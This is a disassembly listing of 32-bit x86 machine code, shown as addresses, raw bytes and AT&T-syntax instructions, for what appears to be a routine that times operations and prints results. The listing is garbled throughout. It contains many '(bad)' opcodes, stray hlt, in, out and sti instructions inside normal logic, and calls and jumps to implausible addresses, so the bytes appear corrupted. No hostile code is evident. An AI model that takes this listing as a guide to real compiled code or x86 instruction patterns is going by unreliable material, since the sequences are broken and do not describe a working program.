  4029a4:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  4029a7:	89 87 c0 8b 45 98    	mov    %eax,-0x67ba7440(%edi)
  4029ad:	6a 00                	push   $0x0
  4029af:	05 f4 52 00 00       	add    $0x52f4,%eax
  4029b4:	d6                   	salc
  4029b5:	e8 73 00 00 83       	call   0x83402a2d
  4029ba:	d1 00                	roll   $1,(%eax)
  4029bc:	89 55 41             	mov    %edx,0x41(%ebp)
  4029bf:	51                   	push   %ecx
  4029c0:	50                   	push   %eax
  4029c1:	e8 ca 4f 00 00       	call   0x407990
  4029c6:	8b d2                	mov    %edx,%edx
  4029c8:	f4                   	hlt
  4029c9:	89 45 98             	mov    %eax,-0x68(%ebp)
  4029cc:	fc                   	cld
  4029cd:	db 6c 6a 00          	fldt   0x0(%edx,%ebp,2)
  4029d1:	05 f4 01 00 ac       	add    $0xac0001f4,%eax
  4029d6:	68 e8 03 00 c8       	push   $0xc80003e8
  4029db:	83 d1 00             	adc    $0x0,%ecx
  4029de:	89 dd                	mov    %ebx,%ebp
  4029e0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4029e1:	51                   	push   %ecx
  4029e2:	50                   	push   %eax
  4029e3:	e8 a8 8b 00 3f       	call   0x3f40b590
  4029e8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4029eb:	8b 72 e8             	mov    -0x18(%edx),%esi
  4029ee:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4029f1:	8b e0                	mov    %eax,%esp
  4029f3:	ec                   	in     (%dx),%al
  4029f4:	de f4                	fdivp  %st,%st(4)
  4029f6:	01 e5                	add    %esp,%ebp
  4029f8:	00 83 d1 00 6a 00    	add    %al,0x6a00d1(%ebx)
  4029fe:	68 e8 03 00 00       	push   $0x3e8
  402a03:	51                   	push   %ecx
  402a04:	50                   	push   %eax
  402a05:	e8 86 8b 00 d1       	call   0xd140b590
  402a0a:	6d                   	insl   (%dx),%es:(%edi)
  402a0b:	4d                   	dec    %ebp
  402a0c:	e4 89                	in     $0x89,%al
  402a0e:	45                   	inc    %ebp
  402a0f:	e8 2e bf e0 2e       	call   0x2f20e942
  402a14:	00 05 f4 0a 00 00    	add    %al,0xaf4
  402a1a:	68 e8 03 00 00       	push   $0x3e8
  402a1f:	83 d1 36             	adc    $0x36,%ecx
  402a22:	64 55                	fs push %ebp
  402a24:	ec                   	in     (%dx),%al
  402a25:	51                   	push   %ecx
  402a26:	50                   	push   %eax
  402a27:	e8 64 8b 00 00       	call   0x40b590
  402a2c:	e1 c7                	loope  0x4029f5
  402a2e:	f4                   	hlt
  402a2f:	01 00                	add    %eax,(%eax)
  402a31:	b5 f1                	mov    $0xf1,%ch
  402a33:	00 83 d3 00 68 e8    	add    %al,-0x1797ff2d(%ebx)
  402a39:	03 00                	add    (%eax),%eax
  402a3b:	00 53 bd             	add    %dl,-0x43(%ebx)
  402a3e:	89 45 dd             	mov    %eax,-0x23(%ebp)
  402a41:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  402a44:	4e                   	dec    %esi
  402a45:	6c                   	insb   (%dx),%es:(%edi)
  402a46:	98                   	cwtl
  402a47:	00 00                	add    %al,(%eax)
  402a49:	1f                   	pop    %ds
  402a4a:	8d 74 ff ff          	lea    -0x1(%edi,%edi,8),%esi
  402a4e:	ff 89 45 d8 8b 85    	decl   -0x7a7427bb(%ecx)
  402a54:	70 ff                	jo     0x402a55
  402a56:	a3 ff 6a 2f 05       	mov    %eax,0x52f6aff
  402a5b:	f3 01 00             	repz add %eax,(%eax)
  402a5e:	00 e5                	add    %ah,%ch
  402a60:	e8 03 00 00 83       	call   0x83402a68
  402a65:	d1 00                	roll   $1,(%eax)
  402a67:	89 55 dc             	mov    %edx,-0x24(%ebp)
  402a6a:	51                   	push   %ecx
  402a6b:	50                   	push   %eax
  402a6c:	01 1f                	add    %ebx,(%edi)
  402a6e:	8b 38                	mov    (%eax),%edi
  402a70:	00 8b 4d bc 8b f8    	add    %cl,-0x77443b3(%ebx)
  402a76:	6c                   	insb   (%dx),%es:(%edi)
  402a77:	45                   	inc    %ebp
  402a78:	b8 6a 00 20 f4       	mov    $0xf420006a,%eax
  402a7d:	01 45 00             	add    %eax,0x0(%ebp)
  402a80:	68 e8 b1 73 00       	push   $0x73b1e8
  402a85:	21 8c 00 8b da b0 50 	and    %ecx,0x50b0da8b(%eax,%eax,1)
  402a8c:	99                   	cltd
  402a8d:	e1 8a                	loope  0x402a19
  402a8f:	84 46 44             	test   %al,0x44(%esi)
  402a92:	45                   	inc    %ebp
  402a93:	a8 dc                	test   $0xdc,%al
  402a95:	12 10                	adc    (%eax),%dl
  402a97:	c2 40 00             	ret    $0x40
  402a9a:	89 89 ce 35 20 d0    	mov    %ecx,-0x2fdfca32(%ecx)
  402aa0:	40                   	inc    %eax
  402aa1:	00 14 c0             	add    %dl,(%eax,%eax,8)
  402aa4:	dd cd                	(bad)
  402aa6:	a8 dd                	test   $0xdd,%al
  402aa8:	45                   	inc    %ebp
  402aa9:	88 dc                	mov    %bl,%ah
  402aab:	4f                   	dec    %edi
  402aac:	10 c2                	adc    %al,%dl
  402aae:	40                   	inc    %eax
  402aaf:	00 89 55 bc dd 5d    	add    %cl,0x5dddbc55(%ecx)
  402ab5:	88 dd                	mov    %bl,%ch
  402ab7:	45                   	inc    %ebp
  402ab8:	90                   	nop
  402ab9:	dc 07                	faddl  (%edi)
  402abb:	b7 e8                	mov    $0xe8,%bh
  402abd:	59                   	pop    %ecx
  402abe:	00 99 5d 90 dd 85    	add    %bl,-0x7a226fa3(%ecx)
  402ac4:	78 ff                	js     0x402ac5
  402ac6:	ff                   	(bad)
  402ac7:	ff                   	lcall  (bad)
  402ac8:	dc 44 10 c2          	faddl  -0x3e(%eax,%edx,1)
  402acc:	40                   	inc    %eax
  402acd:	00 dd                	add    %bl,%ch
  402acf:	9d                   	popf
  402ad0:	5c                   	pop    %esp
  402ad1:	ff                   	(bad)
  402ad2:	ff                   	(bad)
  402ad3:	ff 0f                	decl   (%edi)
  402ad5:	84 64 02 00          	test   %ah,0x0(%edx,%eax,1)
  402ad9:	00 68 08             	add    %ch,0x8(%eax)
  402adc:	dc 40 00             	faddl  0x0(%eax)
  402adf:	ff d6                	call   *%esi
  402ae1:	8b 7e f4             	mov    -0xc(%esi),%edi
  402ae4:	8b 45 4a             	mov    0x4a(%ebp),%eax
  402ae7:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  402aea:	cd 57                	int    $0x57
  402aec:	f2 8b be a8 50 8b 45 	repnz mov 0x458b50a8(%esi),%edi
  402af3:	fc                   	cld
  402af4:	51                   	push   %ecx
  402af5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402af8:	52                   	push   %edx
  402af9:	8b 55 53             	mov    0x53(%ebp),%edx
  402afc:	50                   	push   %eax
  402afd:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402b00:	b2 52                	mov    $0x52,%dl
  402b02:	50                   	push   %eax
  402b03:	68 d8 db 40 00       	push   $0x40dbd8
  402b08:	ff d6                	call   *%esi
  402b0a:	8b 85 68 ff ff ff    	mov    -0x98(%ebp),%eax
  402b10:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402b11:	da 6c ff ff          	fisubrl -0x1(%edi,%edi,8)
  402b15:	ff 83 c4 30 8c f4    	incl   -0xb73cf3c(%ebx)
  402b1b:	d3 48 ef             	rorl   %cl,-0x11(%eax)
  402b1e:	83 d1 35             	adc    $0x35,%ecx
  402b21:	6a 00                	push   $0x0
  402b23:	68 e8 03 00 42       	push   $0x420003e8
  402b28:	51                   	push   %ecx
  402b29:	54                   	push   %esp
  402b2a:	a8 ca                	test   $0xca,%al
  402b2c:	8a 00                	mov    (%eax),%al
  402b2e:	00 8b 4d ec 52 8b    	add    %cl,-0x74ad13b3(%ebx)
  402b34:	4a                   	dec    %edx
  402b35:	e8 50 8b 45 8c       	call   0x8c85b68a
  402b3a:	51                   	push   %ecx
  402b3b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402b3e:	52                   	push   %edx
  402b3f:	8b 55 cc             	mov    -0x34(%ebp),%edx
  402b42:	50                   	push   %eax
  402b43:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402b46:	51                   	push   %ecx
  402b47:	57                   	push   %edi
  402b48:	8d                   	lea    (bad),%ebx
  402b49:	df ff                	(bad)
  402b4b:	ff                   	(bad)
  402b4c:	ff                   	(bad)
  402b4d:	ba 94 8b 85 60       	mov    $0x60858b94,%edx
  402b52:	0b ff                	or     %edi,%edi
  402b54:	ff 05 f4 01 81 00    	incl   0x8101f4
  402b5a:	6a 00                	push   $0x0
  402b5c:	42                   	inc    %edx
  402b5d:	d1 1f                	rcrl   $1,(%edi)
  402b5f:	68 e8 03 00 00       	push   $0x3e8
  402b64:	51                   	push   %ecx
  402b65:	50                   	push   %eax
  402b66:	e8 25 6b 00 00       	call   0x409690
  402b6b:	74 50                	je     0x402bbd
  402b6d:	0d a8 db 6d 12       	or     $0x126ddba8,%eax
  402b72:	ff d6                	call   *%esi
  402b74:	8b 45 80             	mov    -0x80(%ebp),%eax
  402b77:	88 1e                	mov    %bl,(%esi)
  402b79:	84 83 cb 2c 05 f4    	test   %al,-0xbfad335(%ebx)
  402b7f:	01 00                	add    %eax,(%eax)
  402b81:	00 83 e8 00 6a 00    	add    %al,0x6a00e8(%ebx)
  402b87:	68 e8 03 00 7d       	push   $0x7d0003e8
  402b8c:	17                   	pop    %ss
  402b8d:	50                   	push   %eax
  402b8e:	e8 fd 89 00 00       	call   0x40b590
  402b93:	8b 4d f6             	mov    -0xa(%ebp),%ecx
  402b96:	52                   	push   %edx
  402b97:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402b9a:	50                   	push   %eax
  402b9b:	8b 45 94             	mov    -0x6c(%ebp),%eax
  402b9e:	51                   	push   %ecx
  402b9f:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  402ba2:	52                   	push   %edx
  402ba3:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  402ba6:	50                   	push   %eax
  402ba7:	51                   	push   %ecx
  402ba8:	52                   	push   %edx
  402ba9:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402bac:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402baf:	50                   	push   %eax
  402bb0:	8b 6c c6 05          	mov    0x5(%esi,%eax,8),%ebp
  402bb4:	ac                   	lods   %ds:(%esi),%al
  402bb5:	01 31                	add    %esi,(%ecx)
  402bb7:	00 6b 00             	add    %ch,0x0(%ebx)
  402bba:	83 d1 00             	adc    $0x0,%ecx
  402bbd:	68 e8 03 00 00       	push   $0x3e8
  402bc2:	51                   	push   %ecx
  402bc3:	50                   	push   %eax
  402bc4:	a8 0a                	test   $0xa,%al
  402bc6:	89 00                	mov    %eax,(%eax)
  402bc8:	00 52 24             	add    %dl,0x24(%edx)
  402bcb:	68 78 d3 40 00       	push   $0x40d378
  402bd0:	ff 2d 8b 70 bc 8b    	ljmp   *0x8bbc708b
  402bd6:	55                   	push   %ebp
  402bd7:	b8 8b 45 dc 51       	mov    $0x51dc458b,%eax
  402bdc:	8b 9b c8 52 8b 95    	mov    -0x6a74ad38(%ebx),%ebx
  402be2:	b3 ff                	mov    $0xff,%bl
  402be4:	f3 ff 50 8b          	repz call *-0x75(%eax)
  402be8:	85 78 ff             	test   %edi,-0x1(%eax)
  402beb:	ff 22                	jmp    *(%edx)
  402bed:	51                   	push   %ecx
  402bee:	22 4d 9c             	and    -0x64(%ebp),%cl
  402bf1:	52                   	push   %edx
  402bf2:	8b e3                	mov    %ebx,%esp
  402bf4:	98                   	cwtl
  402bf5:	50                   	push   %eax
  402bf6:	8b 4d c7             	mov    -0x39(%ebp),%ecx
  402bf9:	51                   	push   %ecx
  402bfa:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  402bfd:	52                   	push   %edx
  402bfe:	50                   	push   %eax
  402bff:	51                   	push   %ecx
  402c00:	90                   	nop
  402c01:	48                   	dec    %eax
  402c02:	db 40 00             	fildl  0x0(%eax)
  402c05:	ff d6                	call   *%esi
  402c07:	df 6d f8             	fildll -0x8(%ebp)
  402c0a:	6c                   	insb   (%dx),%es:(%edi)
  402c0b:	6d                   	insl   (%dx),%es:(%edi)
  402c0c:	f0 83 c4 58          	lock add $0x58,%esp
  402c10:	3e a5                	movsl  %ds:(%esi),%es:(%edi)
  402c12:	dc 15 30 c2 40 00    	fcoml  0x40c230
  402c18:	df e0                	fnstsw %ax
  402c1a:	f6 5c 05 7a          	negb   0x7a(%ebp,%eax,1)
  402c1e:	02 d9                	add    %cl,%bl
  402c20:	0e                   	push   %cs
  402c21:	dd 45 a8             	fldl   -0x58(%ebp)
  402c24:	dc ea                	fsubr  %st,%st(2)
  402c26:	d9 c8                	fxch   %st(0)
  402c28:	de d9                	fcompp
  402c2a:	df e0                	fnstsw %ax
  402c2c:	2c 00                	sub    $0x0,%al
  402c2e:	41                   	inc    %ecx
  402c2f:	d9 00                	flds   (%eax)
  402c31:	75 09                	jne    0x402c3c
  402c33:	dd d8                	fstp   %st(0)
  402c35:	ab                   	stos   %eax,%es:(%edi)
  402c36:	9f                   	lahf
  402c37:	9a 6d 00 eb 11 dc 5d 	lcall  $0x5ddc,$0x11eb006d
  402c3e:	a8 df                	test   $0xdf,%al
  402c40:	e0 b1                	loopne 0x402bf3
  402c42:	00 93 15 00 75 0a    	add    %dl,0xa750015(%ebx)
  402c48:	68 18 da 40 22       	push   $0x2240da18
  402c4d:	ff 15 78 c4 04 df    	call   *0xdf04c478
  402c53:	84 c8                	test   %cl,%al
  402c55:	c2 39 e8             	ret    $0xe839
  402c58:	38 da                	cmp    %bl,%dl
  402c5a:	dc 87 30 c2 3b 00    	faddl  0x3bc230(%edi)
  402c60:	df e0                	fnstsw %ax
  402c62:	bb c4 05 7a 02       	mov    $0x27a05c4,%ebx
  402c67:	2f                   	das
  402c68:	ad                   	lods   %ds:(%esi),%eax
  402c69:	dd 45 63             	fldl   0x63(%ebp)
  402c6c:	dc c0                	fadd   %st,%st(0)
  402c6e:	d9 c1                	fld    %st(1)
  402c70:	de d9                	fcompp
  402c72:	8c 1c 25 00 41 00 00 	mov    %ds,0x4100(,%eiz,1)
  402c79:	75 09                	jne    0x402c84
  402c7b:	dd 01                	fldl   (%ecx)
  402c7d:	68 88 d9 40 1a       	push   $0x1a40d988
  402c82:	e4 11                	in     $0x11,%al
  402c84:	dc 5d 88             	fcompl -0x78(%ebp)
  402c87:	df e0                	fnstsw %ax
  402c89:	25 3a 41 9c 00       	and    $0x9c413a,%eax
  402c8e:	75 0a                	jne    0x402c9a
  402c90:	68 f8 d8 40 00       	push   $0x40d8f8
  402c95:	ff 37                	push   (%edi)
  402c97:	83 7e 04 df          	cmpl   $0xffffffdf,0x4(%esi)
  402c9b:	2d c0 df 6d d2       	sub    $0xd26ddfc0,%eax
  402ca0:	de e9                	fsubrp %st,%st(1)
  402ca2:	dc 15 30 c2 40 00    	fcoml  0x40c230
  402ca8:	df e0                	fnstsw %ax
  402caa:	82 a0 05 a2 c2 d2 e0 	andb   $0xe0,-0x2d3d5dfb(%eax)
  402cb1:	dd d3                	fst    %st(3)
  402cb3:	73 dc                	jae    0x402c91
  402cb5:	c0 d9 01             	rcr    $0x1,%cl
  402cb8:	de d9                	fcompp
  402cba:	31 e0                	xor    %esp,%eax
  402cbc:	25 00 41 00 00       	and    $0x4100,%eax
  402cc1:	75 09                	jne    0x402ccc
  402cc3:	dd d8                	fstp   %st(0)
  402cc5:	68 68 ea 40 00       	push   $0x40ea68
  402cca:	eb f1                	jmp    0x402cbd
  402ccc:	dc 5d 90             	fcompl -0x70(%ebp)
  402ccf:	df cf                	(bad)
  402cd1:	25 47 41 e9 00       	and    $0xe94147,%eax
  402cd6:	75 0a                	jne    0x402ce2
  402cd8:	53                   	push   %ebx
  402cd9:	d8 d7                	fcom   %st(7)
  402cdb:	40                   	inc    %eax
  402cdc:	00 ff                	add    %bh,%bh
  402cde:	d6                   	salc
  402cdf:	83 c4 04             	add    $0x4,%esp
  402ce2:	df 6d 98             	fildll -0x68(%ebp)
  402ce5:	df 6d c1             	fildll -0x3f(%ebp)
  402ce8:	de 84 dc 60 ef c2 40 	fiadds 0x40c2ef60(%esp,%ebx,8)
  402cef:	00 df                	add    %bl,%bh
  402cf1:	cd f6                	int    $0xf6
  402cf3:	c4 05 7a 00 d9 e0    	les    0xe0d9007a,%eax
  402cf9:	dd 09                	fisttpll (%ecx)
  402cfb:	78 ff                	js     0x402cfc
  402cfd:	ff                   	(bad)
  402cfe:	ff                   	lcall  (bad)
  402cff:	dc c0                	fadd   %st,%st(0)
  402d01:	d9 c1                	fld    %st(1)
  402d03:	de d9                	fcompp
  402d05:	54                   	push   %esp
  402d06:	5b                   	pop    %ebx
  402d07:	25 00 41 00 00       	and    $0x4100,%eax
  402d0c:	75 c0                	jne    0x402cce
  402d0e:	68 50 d7 40 00       	push   $0x40d750
  402d13:	dd d8                	fstp   %st(0)
  402d15:	ff d6                	call   *%esi
  402d17:	83 c4 04             	add    $0x4,%esp
  402d1a:	e9 96 00 00 00       	jmp    0x402db5
  402d1f:	dc d2                	(bad)
  402d21:	78 ff                	js     0x402d22
  402d23:	ff                   	(bad)
  402d24:	ff                   	lcall  (bad)
  402d25:	df e0                	fnstsw %ax
  402d27:	25 00 41 00 5c       	and    $0x5c004100,%eax
  402d2c:	0f 85 81 00 00 00    	jne    0x402db3
  402d32:	68 c0 d6 40 00       	push   $0x40d6c0
  402d37:	ff d6                	call   *%esi
  402d39:	83 c4 04             	add    $0x4,%esp
  402d3c:	eb 77                	jmp    0x402db5
  402d3e:	68 a0 d6 40 00       	push   $0x40d6a0
  402d43:	ff d6                	call   *%esi
  402d45:	8b e0                	mov    %eax,%esp
  402d47:	fc                   	cld
  402d48:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  402d4b:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402d4e:	b8 57 52 8b 55       	mov    $0x558b5257,%eax
  402d53:	92                   	xchg   %eax,%edx
  402d54:	50                   	push   %eax
  402d55:	51                   	push   %ecx
  402d56:	b2 68                	mov    $0x68,%dl
  402d58:	4e                   	dec    %esi
  402d59:	d6                   	salc
  402d5a:	40                   	inc    %eax
  402d5b:	56                   	push   %esi
  402d5c:	ff b6 bb 45 b8 8b    	push   -0x7447ba45(%esi)
  402d62:	4d                   	dec    %ebp
  402d63:	bc 8b 5c 98 2b       	mov    $0x2b985c8b,%esp
  402d68:	c7                   	(bad)
  402d69:	8b 7d 90             	mov    -0x70(%ebp),%edi
  402d6c:	1b cb                	sbb    %ebx,%ecx
  402d6e:	8b 5d 79             	mov    0x79(%ebp),%ebx
  402d71:	51                   	push   %ecx
  402d72:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d75:	50                   	push   %eax
  402d76:	5a                   	pop    %edx
  402d77:	45                   	inc    %ebp
  402d78:	9c                   	pushf
  402d79:	2b d7                	sub    %edi,%edx
  402d7b:	8b 7d a4             	mov    -0x5c(%ebp),%edi
  402d7e:	7a c1                	jp     0x402d41
  402d80:	8b cb                	mov    %ebx,%ecx
  402d82:	6b 8b 45 b4 52 a0 55 	imul   $0x55,-0x5fad4bbb(%ebx),%ecx
  402d89:	b0 2b                	mov    $0x2b,%al
  402d8b:	ca 8b d7             	lret   $0xd78b
  402d8e:	1b d0                	sbb    %eax,%edx
  402d90:	52                   	push   %edx
  402d91:	fc                   	cld
  402d92:	68 58 d6 ec 00       	push   $0xecd658
  402d97:	ff d6                	call   *%esi
  402d99:	8b 45 bc             	mov    -0x44(%ebp),%eax
  402d9c:	8b f6                	mov    %esi,%esi
  402d9e:	b8 16 55 9c 07       	mov    $0x79c5516,%eax
  402da3:	8b 45 98             	mov    -0x68(%ebp),%eax
  402da6:	51                   	push   %ecx
  402da7:	52                   	push   %edx
  402da8:	50                   	push   %eax
  402da9:	57                   	push   %edi
  402daa:	53                   	push   %ebx
  402dab:	bd 34 81 40 00       	mov    $0x408134,%ebp
  402db0:	ff d6                	call   *%esi
  402db2:	83 c4 58             	add    $0x58,%esp
  402db5:	a1 1c 4a 40 00       	mov    0x404a1c,%eax
  402dba:	85 c0                	test   %eax,%eax
  402dbc:	21 84 c5 00 4d 40 50 	and    %eax,0x50404d00(%ebp,%eax,8)
  402dc3:	3d 5b 02 41 00       	cmp    $0x41025b,%eax
  402dc8:	01 35 46 b8 00 00    	add    %esi,0xb846
  402dce:	00 68 f4             	add    %ch,-0xc(%eax)
  402dd1:	43                   	inc    %ebx
  402dd2:	40                   	inc    %eax
  402dd3:	00 ff                	add    %bh,%bh
  402dd5:	d6                   	salc
  402dd6:	95                   	xchg   %eax,%ebp
  402dd7:	c4 04 33             	les    (%ebx,%esi,1),%eax
  402dda:	db 8b bb 9d 58 40    	fisttpl 0x40589dbb(%ebx)
  402de0:	00 85 ff 7f 0f 68    	add    %al,0x680f7fff(%ebp)
  402de6:	e0 d5                	loopne 0x402dbd
  402de8:	40                   	inc    %eax
  402de9:	00 ff                	add    %bh,%bh
  402deb:	8e 83 c4 04 67 87    	mov    -0x7898fb3c(%ebx),%es
  402df1:	00 00                	add    %al,(%eax)
  402df3:	00 6a 00             	add    %ch,0x0(%edx)
  402df6:	83 37 02             	xorl   $0x2,(%edi)
  402df9:	68 e8 b7 00 00       	push   $0xb7e8
  402dfe:	7c 34                	jl     0x402e34
  402e00:	8b 0d ac 02 41 cb    	mov    0xcb4102ac,%ecx
  402e06:	22 c8                	and    %al,%cl
  402e08:	0b 41 00             	or     0x0(%ecx),%eax
  402e0b:	c1 e1 96             	shl    $0x96,%ecx
  402e0e:	8b 54 01 f8          	mov    -0x8(%ecx,%eax,1),%edx
  402e12:	81 c2 f4 80 00 00    	add    $0x80f4,%edx
  402e18:	8b 18                	mov    (%eax),%ebx
  402e1a:	01 b2 83 48 16 f7    	add    %esi,-0x8e9b77d(%edx)
  402e20:	52                   	push   %edx
  402e21:	e8 10 87 00 00       	call   0x40b536
  402e26:	52                   	push   %edx
  402e27:	50                   	push   %eax
  402e28:	12 bc d5 40 16 ff d6 	adc    -0x2900e9c0(%ebp,%edx,8),%bh
  402e2f:	83 c4 0c             	add    $0xc,%esp
  402e32:	eb 47                	jmp    0x402e7b
  402e34:	8b cf                	mov    %edi,%ecx
  402e36:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
  402e3b:	0f af b4 ac 02 41 af 	imul   -0x850befe(%esp,%ebp,4),%esi
  402e42:	f7 
  402e43:	e9 c1 fa 05 a2       	jmp    0xa2462909
  402e48:	c8 0b 41 00          	enter  $0x410b,$0x0
  402e4c:	8b ca                	mov    %edx,%ecx
  402e4e:	c1 7f 1f 03          	sarl   $0x3,0x1f(%edi)
  402e52:	d1 c1                	rol    $1,%ecx
  402e54:	e2 05                	loop   0x402e5b
  402e56:	7f 4c                	jg     0x402ea4
  402e58:	02 18                	add    (%eax),%bl
  402e5a:	81 c1 f4 01 00 00    	add    $0x1f4,%ecx
  402e60:	7c 4f                	jl     0x402eb1
  402e62:	02 1c 83             	add    (%ebx,%eax,4),%bl
  402e65:	d2 00                	rolb   %cl,(%eax)
  402e67:	52                   	push   %edx
  402e68:	51                   	push   %ecx
  402e69:	e8 22 37 00 00       	call   0x406590
  402e6e:	21 50 65             	and    %edx,0x65(%eax)
  402e71:	68 ac d5 ce 00       	push   $0xced5ac
  402e76:	ff d6                	call   *%esi
  402e78:	d0 c4                	rol    $1,%ah
  402e7a:	c6                   	(bad)
  402e7b:	36 5b                	ss pop %ebx
  402e7d:	04 83                	add    $0x83,%al
  402e7f:	fb                   	sti
  402e80:	24 0f                	and    $0xf,%al
  402e82:	82 54 ff 2d ff       	adcb   $0xff,0x2d(%edi,%edi,8)
  402e87:	a1 e0 6c 41 00       	mov    0x416ce0,%eax
  402e8c:	85 45 0f             	test   %eax,0xf(%ebp)
  402e8f:	84 c3                	test   %al,%bl
  402e91:	00 00                	add    %al,(%eax)
  402e93:	00 68 eb             	add    %ch,-0x15(%eax)
  402e96:	24 04                	and    $0x4,%al
  402e98:	00 50 ff             	add    %dl,-0x1(%eax)
  402e9b:	15 48 70 40 00       	adc    $0x407048,%eax
  402ea0:	8b f8                	mov    %eax,%edi
  402ea2:	83 c4 08             	add    $0x8,%esp
  402ea5:	96                   	xchg   %eax,%esi
  402ea6:	ff 75 16             	push   0x16(%ebp)
  402ea9:	68 2b d5 40 00       	push   $0x40d52b
  402eae:	ff 15 4c 37 40 00    	call   *0x40374c
  402eb4:	83 c4 04             	add    $0x4,%esp
  402eb7:	6a 01                	push   $0x1
  402eb9:	ff 15 70 af ea b8    	call   *0xb8eaaf70
  402ebf:	68 6c d5 40 00       	push   $0x40d56c
  402ec4:	57                   	push   %edi
  402ec5:	ff 15 80 c1 74 00    	call   *0x74c180
  402ecb:	8b 1d 80 c1 40 00    	mov    0x40c180,%ebx
  402ed1:	83 c4 08             	add    $0x8,%esp
  402ed4:	33 f6                	xor    %esi,%esi
  402ed6:	85 f6                	test   %esi,%esi
  402ed8:	75 0a                	jne    0x402ee4
  402eda:	70 c8                	jo     0x402ea4
  402edc:	0b 41 00             	or     0x0(%ecx),%eax
  402edf:	df 68 18             	fildll 0x18(%eax)
  402ee2:	eb 46                	jmp    0x402f2a
  402ee4:	83 fe 64             	cmp    $0x64,%esi
  402ee7:	75 15                	jne    0x402efe
  402ee9:	8b 0d ac 02 41 00    	mov    0x4102ac,%ecx
  402eef:	dd 15 c8 0b 6f 00    	fstl   0x6f0bc8
  402ef5:	c1 e1 05             	shl    $0x5,%ecx
  402ef8:	83 6c 11 f8 eb       	subl   $0xffffffeb,-0x8(%ecx,%edx,1)
  402efd:	2c a1                	sub    $0xa1,%al
  402eff:	ac                   	lods   %ds:(%esi),%al
  402f00:	02 41 00             	add    0x0(%ecx),%al
  402f03:	0f af c6             	imul   %esi,%eax
  402f06:	89 7c f4 92          	mov    %edi,-0x6e(%esp,%esi,8)
  402f0a:	76 f4                	jbe    0x402f00
  402f0c:	dc 0d 08 c2 40 00    	fmull  0x40c208
  402f12:	43                   	inc    %ebx
  402f13:	05 00 c2 5d e4       	add    $0xe45dc200,%eax
  402f18:	e8 c1 ab 00 00       	call   0x40dade
  402f1d:	8b 0d c8 0b 41 00    	mov    0x410bc8,%ecx
  402f23:	bf e0 05 df 6c       	mov    $0x6cdf05e0,%edi
  402f28:	08 18                	or     %bl,(%eax)
  402f2a:	dc 0d 10 c2 40 81    	fmull  0x8140c210
  402f30:	dd 79 d8             	fnstsw -0x28(%ecx)
  402f33:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402f36:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402f39:	52                   	push   %edx
  402f3a:	40                   	inc    %eax
  402f3b:	56                   	push   %esi
  402f3c:	68 76 d5 40 00       	push   $0x40d576
  402f41:	57                   	push   %edi
  402f42:	ff 97 83 2b 14 46    	call   *0x46142b83(%edi)
  402f48:	a8 fe                	test   $0xfe,%al
  402f4a:	de 7c 89 57          	fidivrs 0x57(%ecx,%ecx,4)
  402f4e:	ff 15 50 d1 40 a5    	call   *0xa540d150
  402f54:	83 c4 61             	add    $0x61,%esp
  402f57:	a1 b8 9f 41 00       	mov    0x419fb8,%eax
  402f5c:	85 c0                	test   %eax,%eax
  402f5e:	0f 84 61 01 00 00    	je     0x4030c5
  402f64:	68 a8 d5 40 00       	push   $0x40d5a8
  402f69:	50                   	push   %eax
  402f6a:	bd 15 48 c1 40       	mov    $0x40c14815,%ebp
  402f6f:	12 83 c4 08 a1 45    	adc    0x45a108c4(%ebx),%al
  402f75:	fc                   	cld
  402f76:	bf 04 7b 16 68       	mov    $0x68167b04,%edi
  402f7b:	40                   	inc    %eax
  402f7c:	a1 40 95 ff 15       	mov    0x15ff9540,%eax
  402f81:	4c                   	dec    %esp
  402f82:	b9 40 00 f3 c4       	mov    $0xc4f30040,%ecx
  402f87:	04 6a                	add    $0x6a,%al
  402f89:	01 ff                	add    %edi,%edi
  402f8b:	15 70 c1 40 00       	adc    $0x40c170,%eax
  402f90:	68 14 d5 40 50       	push   $0x5040d514
  402f95:	52                   	push   %edx
  402f96:	ff 15 80 c1 40 00    	call   *0x40c180
  402f9c:	a1 83 02 41 00       	mov    0x410283,%eax
  402fa1:	83 c4 a8             	add    $0xffffffa8,%esp
  402fa4:	85 21                	test   %esp,(%ecx)
  402fa6:	c7 45 4b 00 00 00 00 	movl   $0x0,0x4b(%ebp)
  402fad:	1b 8e a4 01 00 55    	sbb    0x550001a4(%esi),%ecx
  402fb3:	33 f6                	xor    %esi,%esi
  402fb5:	a1 c8 0b c1 00       	mov    0xc10bc8,%eax
  402fba:	8b 29                	mov    (%ecx),%ebp
  402fbc:	06                   	push   %es
  402fbd:	04 8b                	add    $0x8b,%al
  402fbf:	14 07                	adc    $0x7,%al
  402fc1:	51                   	push   %ecx
  402fc2:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
  402fc8:	21 50 43             	and    %edx,0x43(%eax)
  402fcb:	51                   	push   %ecx
  402fcc:	61                   	popa
  402fcd:	00 43 8b             	add    %al,-0x75(%ebx)
  402fd0:	3d c8 3f 88 cf       	cmp    $0xcf883fc8,%eax
  402fd5:	e6 00                	out    %al,$0x0
  402fd7:	68 e8 fb 00 7e       	push   $0x7e00fbe8
  402fdc:	d6                   	salc
  402fdd:	4c                   	dec    %esp
  402fde:	0c 1c                	or     $0x1c,%al
  402fe0:	8b ec                	mov    %esp,%ebp
  402fe2:	3e 10 8b e2 3e 14 db 	adc    %cl,%ds:-0x24ebc11e(%ebx)
  402fe9:	4d                   	dec    %ebp
